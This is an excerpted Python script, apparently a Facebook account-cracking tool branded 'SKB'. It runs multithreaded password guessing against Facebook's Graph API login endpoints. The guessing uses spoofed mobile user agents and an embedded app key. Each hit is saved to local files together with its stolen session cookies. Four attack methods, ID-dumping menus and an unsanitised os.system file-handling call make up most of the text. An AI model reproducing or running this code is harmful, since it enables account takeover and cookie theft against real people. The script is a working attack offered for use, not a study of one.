...
from concurrent.futures import ThreadPoolExecutor as sarfrazSKB
from string import * 
...
def randBuildLSB():
    ...
    ua = f'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
...
sys.stdout.write('\x1b]2; SKB\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """                                                   
\033[1;37m   SSSSSSSSSSSSSSS KKKKKKKKK    KKKKKKKBBBBBBBBBBBBBBBBB   
\033[1;37m SS:::::::::::::::SK:::::::K    K:::::KB::::::::::::::::B  
\033[1;37mS:::::SSSSSS::::::SK:::::::K    K:::::KB::::::BBBBBB:::::B 
\033[1;37mS:::::S     SSSSSSSK:::::::K   K::::::KBB:::::B     B:::::B
\033[1;37mS:::::S            KK::::::K  K:::::KKK  B::::B     B:::::B
\033[1;37mS:::::S              K:::::K K:::::K     B::::B     B:::::B
\033[1;37m S::::SSSS           K::::::K:::::K      B::::BBBBBB:::::B 
\033[1;37m  SS::::::SSSSS      K:::::::::::K       B:::::::::::::BB  
\033[1;32m    SSS::::::::SS    K:::::::::::K       B::::BBBBBB:::::B 
\033[1;32m       SSSSSS::::S   K::::::K:::::K      B::::B     B:::::B
\033[1;32m            S:::::S  K:::::K K:::::K     B::::B     B:::::B
\033[1;32m            S:::::SKK::::::K  K:::::KKK  B::::B     B:::::B
\033[1;32mSSSSSSS     S:::::SK:::::::K   K::::::KBB:::::BBBBBB::::::B
\033[1;32mS::::::SSSSSS:::::SK:::::::K    K:::::KB:::::::::::::::::B 
\033[1;32mS:::::::::::::::SS K:::::::K    K:::::KB::::::::::::::::B  
\033[1;32m SSSSSSSSSSSSSSS   KKKKKKKKK    KKKKKKKBBBBBBBBBBBBBBBBB
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Edit
\033[1;37m Facebook:            Moe Wai Yan
\033[1;37m Github  :            SKB
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SKB Menu ")
        exit()
  ...
  ##  print(f'[W] Join Whatsapp Group ')
    ...
    if select =='1':
      ...
      ###  os.system('xdg-open https://chat.whatsapp.com/J3gpK8NYNQBHhEYnVxN4X7')
        ...
        os.system('xdg-open https://m.facebook.com/groups/471529183222807/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SKB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SKB] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SKBb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SKBb};{ckkk}"
                    print(f"\r{R} [SKB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SKB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SKB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [SKB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SKB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SKB] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/245106334;FBCR/Plus;FBMF/samsung;FBBD/samsung;FBDV/SM-J730F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1920};FB_FW/1;]',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SKB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SKB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SKB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SKB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SKB] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SKB] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SKB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SKB_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazSKB(max_workers=30) as SKBworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SKBworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SKBworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SKBworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SKBworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SKB.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SKB.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SKB = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+SKB+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SKB )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back SKB Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SKB.txt\n') 
        filepath = input("Put File Name: ")
